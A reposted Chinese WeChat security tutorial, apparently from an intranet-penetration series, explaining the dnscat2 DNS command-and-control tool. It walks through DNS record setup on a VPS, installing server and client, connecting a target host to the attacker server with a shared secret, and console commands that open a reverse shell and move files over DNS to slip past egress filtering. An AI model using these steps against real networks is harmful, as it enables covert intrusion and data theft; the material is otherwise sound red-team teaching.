> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/JWELm91Csuzp_keVUT-kkA)

本公众号发布的文章均转载自互联网或经作者投稿授权的原创，文末已注明出处，其内容和图片版权归原网站或作者本人所有，并不代表安世加的观点，若有无意侵权或转载不当之处请联系我们处理，谢谢合作！

欢迎各位添加微信号：**asj-jacky**

加入**安世加** 交流群 和大佬们一起交流安全技术

dnscat2
=======

![](https://mmbiz.qpic.cn/mmbiz_png/WVxyLrxQd6b3VZ3holOVicTBzYgvvXAQXAgChtTUUKpJR1ESicAgbNMuFNTh4HwtA3paM82D6SpyoGumdkUYxBCg/640?wx_fmt=png)

dnscat2 是一款开源软件，使用 DNS 协议创建加密的 C&C 通道，通过预共享密钥进行身份验证；使用 Shell 及 DNS 查询类型 (TXT、MX、CNAME、A、AAAA)，多个同时进行的会话类似于 SSH 中的隧道。dnscat2 的客户端是有 Windows 版和 Linux 版，服务端是用 Ruby 语言编写的。严格的说，dnscat2 是一个命令与控制工具。

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKqZ1lAibiagnSN4LdPpVEibKluPQtV2raTvhPrzyialVtdmpoYSydiaGmL3w/640?wx_fmt=png)

  

使用 dnscat2 隧道的模式有两种，分别是直连模式和中继模式。

*   直连模式：客户端直接向指定 IP 地址的 DNS 服务器发起 DNS 解析请求
    
*   中继模式：DNS 经过互联网的迭代解析，指向指定的 DNS 服务器。与直连模式相比，中继模式的速度较慢
    

如果目标内网放行所有的 DNS 请求，dnscat2 会使用直连模式，通过 UDP 的 53 端口进行通信 (不需要域名，速度快，而且看上去仍然像普通的 DNS 查询)。在请求日志中，所有的域名都是以 dnscat 开头的，因此防火墙可以很容易地将直连模式的通信检测出来。

如果目标内网的请求仅限于白名单服务器或指定的域，dnscat2 会使用中继模式来申请一个域名，并将运行 dnscat2 服务端的服务器指定为受信任的 DNS 服务器。

DNS 隧道的应用场景如下：在安全策略严格的内网环境中，常见的 C&C 通信端口会被众多安全设备所监控，该网段只允许白名单流量出站，同时其他端口都被屏蔽，传统的 C&C 通信无法建立。这种情况下，可以通过使用 DNS 建立隐蔽隧道来进行通信。

dnscat2 通过 DNS 进行控制并执行命令。与同类工具相比，dnscat2 具有如下特点：

*   支持多个会话
    
*   流量加密
    
*   使用密钥防止 MiTM 攻击
    
*   在内存中直接执行 PowerShell 脚本
    
*   隐蔽通信
    

  

---

搭建 dnscat2 隧道步骤

### （1）：部署域名解析

首先，用一台公网的 Linux 系统的 VPS 作为 C&C 服务器 (注意：VPS 的 53 端口一定要开放)，并准备好一个可以配置的域名 (这里我们假设是 hack.com)。然后，去配置域名的记录。首先创建记录 A，将自己的域名 www. hacker.com 解析到 VPS 服务器地址。然后，创建 NS 记录，将 test.hack.com 指向 www. hacker.com  。

![](https://mmbiz.qpic.cn/mmbiz_png/US10Gcd0tQHmdzSPtH4ymM026N4bDfJfoBdq9kAzE8MFupNAnlbIKoicu0PvnDEtoL2KyiczAxrKnH0M9sKfKsvA/640?wx_fmt=png)

*   第一条 A 类解析是在告诉域名系统，www. hacker.com 的 IP 地址是 xx.xx.xx.xx 。
    
*   第二条 NS 解析是在告诉域名系统，想要知道 test.hack.com 的 IP 地址，就去问 www. hacker.com  。
    

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKLmNQMwqrZgyJJ6qia4gLZpDgS6YvKky5M7Al3HjJibDO2XDDHDLer85Q/640?wx_fmt=png)

为什么要设置 NS 类型的记录呢？因为 NS 类型的记录不是用于设置某个域名的 DNS 服务器的，而是用于设置某个子域名的 DNS 服务器的。

**如何验证域名解析设置是否成功？**在随便一台电脑上 ping 域名  ，若能 ping 通，且显示的 IP 地址是我们配置的 VPS 的地址，说明第一条 A 类解析设置成功并已生效。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKicytBN02x6qibzS1IqY0X82J7I7jBt1nGB8TRhslyGdOYgbl6ku7icR7A/640?wx_fmt=png)

然后在我们的 VPS 上执行以下命令监听 UDP53 端口

```
tcpdump -n -i eth0 udp dst port 53
```

在任意一台机器上执行  nslookup test.hack.com 命令，如果在我们的 VPS 监听的端口有查询信息，说明第二条记录设置成功

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKKATuP6w9uHvPU48L39ibAVc6CYhNgyCgsIAgbZYFF5ktaibmDm0OfFoQ/640?wx_fmt=png)

### （2）：安装 dnscat2 服务端

在 VPN 服务器上安装 dnscat2 服务端。

![](https://mmbiz.qpic.cn/mmbiz_png/US10Gcd0tQHmdzSPtH4ymM026N4bDfJfoBdq9kAzE8MFupNAnlbIKoicu0PvnDEtoL2KyiczAxrKnH0M9sKfKsvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umK5TsZnoZAausIic3UXHTXmsg49XvhlVPSwDNYVMib1yViaxicUKfQiadRvGA/640?wx_fmt=png)

```
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
gem install bundler
bundle install
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKSVMObZ5fhf8mWRoOcqfhTmLTiarVqPBIJ0njaD7qCpfaXwvetTKhmvQ/640?wx_fmt=png)

###   

### (3）：在目标主机上安装 dnscat2 客户端

dnscat2 客户端是用 C 语言编写的，因此在使用前需要先进行编译。

![](https://mmbiz.qpic.cn/mmbiz_png/US10Gcd0tQHmdzSPtH4ymM026N4bDfJfoBdq9kAzE8MFupNAnlbIKoicu0PvnDEtoL2KyiczAxrKnH0M9sKfKsvA/640?wx_fmt=png)

*   如果目标服务器是 Windows 系统，则可以直接使用编译好的 dnscat2 客户端，或者 PowerShell 版本的 dnscat2(目标机器需要支持 PowerShell2.0 以上版本)
    
*   如果目标服务器是 Linux 系统，则需要在目标机器上执行如下命令安装客户端。
    

**Linux 安装 dnscat2 客户端**

```
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client/
make
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKJg2Tg4RJPqRhEG1EDlQ4c1BqOIFUHic38WcmjxaZ8BIslBqCicd3sLBQ/640?wx_fmt=png)  

### （4）：测试客户端服务端是否连通

服务器目前在监听状态，执行以下命令测试客户端能否与服务器进行通信

![](https://mmbiz.qpic.cn/mmbiz_png/US10Gcd0tQHmdzSPtH4ymM026N4bDfJfoBdq9kAzE8MFupNAnlbIKoicu0PvnDEtoL2KyiczAxrKnH0M9sKfKsvA/640?wx_fmt=png)

```
dnscat2-v0.07-client-win32.exe --ping test.hack.com
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKPiaePNeG82icMXWAa1LKGyUvDRTGiaw6ZvnSZJXgSlwlEHFgGQ5zPVGVg/640?wx_fmt=png)

可以看到，服务器收到了客户端的请求

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKG5g128T0ogDJcDy3ibNic4fyKjial0HicTkQlBRysNm6tQeWuH0cibzLjXA/640?wx_fmt=png)

  

---

中继模式建立隧道

### 服务端

在**服务端**执行以下模式进行监听

```
ruby ./dnscat2.rb test.hack.com -e open -c root@123456 --no-cache
    -e：指定安全级别，open表示服务端运行客户端不进行加密
    -c：指定密钥
    --no-cache：禁止缓存，一定添加该选项，因为powershell-dnscat2客户端域dnscat2服务端的Caching模式不兼容
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKSVMObZ5fhf8mWRoOcqfhTmLTiarVqPBIJ0njaD7qCpfaXwvetTKhmvQ/640?wx_fmt=png)

### 客户端

**客户端 (C 语言版本的)** 执行以下命令，连接服务端

```
dnscat2-v0.07-client-win32.exe --dns domain=test.hack.com --secret=root@123456
```

如下，客户端显示 Session established！，表示连接成功。  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKW1hBffwlHNUKWRvE86byDav8rcB7Z6b5CHSLtsbEvJDW6MWFXXczlA/640?wx_fmt=png)

**客户端 (PowerShell 版本)** 执行以下命令，连接服务端

```
dnscat2-v0.07-client-win32.exe --dns domain=test.hack.com --secret=root@123456
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKpuTPAxx5MLCCKicFqI8iaKCvtUME5qTU1J9kqU7UCm1fRyOtxB4zxZJw/640?wx_fmt=png)

**客户端 (Linux 版本)** 执行以下命令，连接服务端

```
cd dnscat2/client
./dnscat --dns domain=test.hack.com --secret=root@123456
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKDojD6QxKKKwtt9icUmQu0Hxh8iaCOP7m8phVXdB8TPFjXa9Aicge7WBsA/640?wx_fmt=png)

### 执行命令

我们服务端这边也会显示 New window created：1 ，说明新建了一个 session

然后我们执行下面命令

```
sessions      #查看当前建立的session
windows       #查看当前建立的session，和sessions一样
session -i 1  #进入第一个session，和MSF一样
window  -i 1  #进入第一个session，和session -i 1一样
help          #查看命令帮助
    clear：清屏
    delay：修改远程响应延时
    exec ：执行远程机器上的指定程序，例如PowerShell或VBS
    shell：得到一个反弹的shell
    download、upload：上传、下载文件，速度较慢，适合小文件
    suspend：返回上一层，相当于使用快捷键 Ctrl+Z
    listen：类似于SSH隧道的-L参数(本地转发)
    ping：用于确认目标机器是否在线，若返回pong，说明目标机器在线
    shutdown：切断当前会话
    quit：退出dnscat2控制台
    kill id：切断通道
    set：设置值，例如设置 security=open
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKjyZRQYwaSnPxGamorrGLP12VtiaDe27zyuw1DJsO7P5oJdTE8afdR7Q/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKC46HkicwXgxRgNxqicnaWlr7WrnkrwZWzM5O18U8a6StpD2hQFpOgm2g/640?wx_fmt=png)

我们执行 shell，然后会反弹一个 shell 过来。接着执行 suspend 返回上一层，sessions 查看，可以看到现在有两个 session 了。session -i 2 进入反弹回来的 shell，我们就可以执行 CMD 命令了

```
shell           #得到一个反弹的shell
suspend         #返回上一层
session -i  2   #进入反弹过来的shell
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKbaht3ibCuNbGOEHiaauVPFXjaO5m8Q1iaZvKoWF8Ur6EiaYRepSp0fdImg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e7dBIQzVhtLN8SMwgz6umKVNqaicoeozpGLLHBlELmDhcoga8tDdpxcsEBCVjWuB7ibwpzEvicgFSdw/640?wx_fmt=png)

**相关链接：**

[内网渗透（二十一） | 内网转发及隐蔽隧道 ：应用层隧道技术之使用 DNS 搭建隧道 (iodine)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247499072&idx=1&sn=2eb899190b192d81209c02f774b9fdd6&chksm=fc7bf99dcb0c708bfdb3bdeacae6d145add21e3de06c2d8a0c9c0c933c5eb5e4109ef25e665a&scene=21#wechat_redirect)  

[内网渗透（二十）| 内网转发及隐蔽隧道：使用 DNS 进行命令控制 (DNS-Shell)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247497712&idx=2&sn=3334ef9b66bf49ae83d51eb0829a78c2&chksm=fc7bf32dcb0c7a3b98c8f3a3eab315bf0afb9d463662d07520367a8cc82d517e5b2c393e3037&scene=21#wechat_redirect)  

[内网渗透（十九）| 内网转发及隐蔽隧道：使用 ICMP 进行命令控制 (Icmpsh)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247497168&idx=1&sn=19136898b3a7f46873a836d31a58fa21&chksm=fc7bf10dcb0c781b4e865ca53cb9a83fd32bf7889477211118da4ea70481a682d5e459c5ccc0&scene=21#wechat_redirect)  

[内网渗透（十八）| 工具的使用：MSF 中获取用户密码](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247495828&idx=3&sn=64b978670f81deee0a5e07137799be05&chksm=fc7bf449cb0c7d5fdacd74bc9d760134228b94cf04003a2237e92755b1477f29a267f4e52046&scene=21#wechat_redirect)  

[内网渗透（十七） | 内网转发及隐蔽隧道：使用 SSH 做端口转发以及反向隧道](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247494972&idx=1&sn=0e309e74481b64577b87c3802d75858c&chksm=fc7be9e1cb0c60f71eb23300f692cea9936327254e285851fb7f6ee9fcd57debef711d69766b&scene=21#wechat_redirect)  

[内网渗透（十六） | 域分析工具 BloodHound 的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247494062&idx=1&sn=0c486f53daca08ee61abc51926db2b96&chksm=fc7bed73cb0c646557767e2e21d3c0113df80f831263dea4ce45bd6969da44f27ee700518427&scene=21#wechat_redirect)  

[内网渗透 | 红蓝对抗：Windows 利用 WinRM 实现端口复用打造隐蔽后门](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247493916&idx=2&sn=eacc42e5f8f68fc65dae1c8a1201f014&chksm=fc7bedc1cb0c64d7115c0c3bf84410e29102a25627891c9eb85cba2026b7bc3622a9ebb5e2b2&scene=21#wechat_redirect)  

[内网渗透（十五） | psexec 工具使用浅析 (admin$)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247493004&idx=1&sn=e908ac6ef03c0b5ae0cc5a2cabba7ebb&chksm=fc7be151cb0c684789bbc5f6a54e5906a3fed929eeffdba7667839491826fbb029bba295ef82&scene=21#wechat_redirect)  

[内网渗透（十四） | 工具的使用 | Impacket 的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247492731&idx=1&sn=570c1d9e12ef39709e289b5cc9e2447f&chksm=fc7be0a6cb0c69b0d94c41408b862214beaa631b04ba32f2307819a8b3ac445726849cb24e7f&scene=21#wechat_redirect)

[内网渗透（十三） | WinRM 远程管理工具的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247492427&idx=1&sn=af3a862d78184e93b6e9377f12bce354&chksm=fc7be796cb0c6e80a057dff2a7d67e3483c33e8da2d3a7acb84d04fdd997f28cb89f1fd617fd&scene=21#wechat_redirect)  

[内网渗透（十二） | 利用委派打造隐蔽后门 (权限维持)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247491363&idx=1&sn=e5d6670b0f76299d92110d7b679ad70b&chksm=fc781bfecb0f92e8aacaa6f4f7788ed48577e25f943d92073b1b26e68bfbc8f505b2dd2fa4d8&scene=21#wechat_redirect)  

[内网渗透（十一） | 哈希传递攻击 (Pass-the-Hash,PtH)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490908&idx=1&sn=97594fbbef40346d07b5a6e5185ce77e&chksm=fc781981cb0f9097d18f4b32ff39f59b3512cedd35f0810ad5f61b661e631153f8c4e157d875&scene=21#wechat_redirect)  

[技术干货 | 工具：Social engineering tookit 钓鱼网站](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490513&idx=2&sn=10afb29a20f37df05ebb12ea4d540e1f&chksm=fc781f0ccb0f961a85e646dd54e977dbcaeb5569be6701db4c29b9e204d964bab3ded6bf1999&scene=21#wechat_redirect)

[技术干货 | 工具的使用：CobaltStrike 上线 Linux 主机 (CrossC2)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490608&idx=1&sn=f2b2ea93b109447aa8cc2c872aa87c52&chksm=fc7818edcb0f91fbf85fa53f71e9967fc29fc93f6a783eed154707ca2dec24ca7f419fde5705&scene=21#wechat_redirect)

[内网渗透（十） | 票据传递攻击](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490376&idx=2&sn=c070dd4c761b49d3fabd573cc9c96b5a&chksm=fc781f95cb0f9683b0f6c64f5db5823973c1b10e87b1452192bbed6c1159eccf6e8f2fd0290b&scene=21#wechat_redirect)  

[内网渗透（九） | Windows 域的管理](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490197&idx=1&sn=4682065ddcab00b584918bc267e33f53&chksm=fc781e48cb0f975eddc44d77698fbb466d0eac7d745a6e5bbaf131560b3d4f9e22c1a359d241&scene=21#wechat_redirect)  

[内网渗透（八） | 内网转发工具的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490042&idx=1&sn=136d4057044a7d6f6cb5b57d20f7954a&chksm=fc781d27cb0f9431ec590662ab4e6bcd31b303e7caa20a2b116fd9a9b97e9e3be0bc34408490&scene=21#wechat_redirect)  

[内网渗透 | 域内用户枚举和密码喷洒攻击 (Password Spraying)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489985&idx=1&sn=0b7bce093e501b9817f263c24e0ed5b8&chksm=fc781d1ccb0f940aad0c9b2b06b68c7a58b0b4c513fe45f7da6e6438cac76d4778e61122faf8&scene=21#wechat_redirect)  

[内网渗透（七） | 内网转发及隐蔽隧道：网络层隧道技术之 ICMP 隧道 (pingTunnel/IcmpTunnel)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489736&idx=2&sn=0cb551ee520860878c2c33108033c00c&chksm=fc781c15cb0f9503f672aa0bd18cb13fef4c60124ba5978ab947c34272b2d8a28c584a99219d&scene=21#wechat_redirect)  

[内网渗透（六） | 工作组和域的区别](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489205&idx=1&sn=24f9a2e0e6b92a167f3082bb6e09c734&chksm=fc781268cb0f9b7e3c11d19a9fb41567124055eb0e8dd526cbbaf1e9393ff707f9fa9d10c32b&scene=21#wechat_redirect)  

[内网渗透（五） | AS-REP Roasting 攻击](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489128&idx=1&sn=dac676323e81307e18dd7f6c8998bde7&chksm=fc7812b5cb0f9ba3a63c447468b7e1bdf3250ed0a6217b07a22819c816a8da1fdf16c164fce2&scene=21#wechat_redirect)

[内网渗透 | 内网穿透工具 FRP 的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489057&idx=3&sn=f81ef113f1f136c2289c8bca24c5deb1&chksm=fc7812fccb0f9beaa65e5e9cf40cf9797d207627ae30cb8c7d42d8c12a2cb0765700860dab84&scene=21#wechat_redirect)  

[内网渗透（四） | 域渗透之 Kerberoast 攻击_Python](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488972&idx=1&sn=87a6d987de72a03a2710f162170cd3a0&chksm=fc781111cb0f98070f74377f8348c529699a5eea8497fd40d254cf37a1f54f96632da6a96d83&scene=21#wechat_redirect)  

[内网渗透（三） | 域渗透之 SPN 服务主体名称](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488936&idx=1&sn=82c127c8ad6d3e36f1a977e5ba122228&chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&scene=21#wechat_redirect)  

[内网渗透（二） | MSF 和 CobaltStrike 联动](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488905&idx=2&sn=6e15c9c5dd126a607e7a90100b6148d6&chksm=fc781154cb0f98421e25a36ddbb222f3378edcda5d23f329a69a253a9240f1de502a00ee983b&scene=21#wechat_redirect)  

[内网渗透 | 域内认证之 Kerberos 协议详解](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488900&idx=3&sn=dc2689efec7757f7b432e1fb38b599d4&chksm=fc781159cb0f984f1a44668d9e77d373e4b3bfa25e5fcb1512251e699d17d2b0da55348a2210&scene=21#wechat_redirect)  

[内网渗透（一） | 搭建域环境](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488866&idx=2&sn=89f9ca5dec033f01e07d85352eec7387&chksm=fc7811bfcb0f98a9c2e5a73444678020b173364c402f770076580556a053f7a63af51acf3adc&scene=21#wechat_redirect)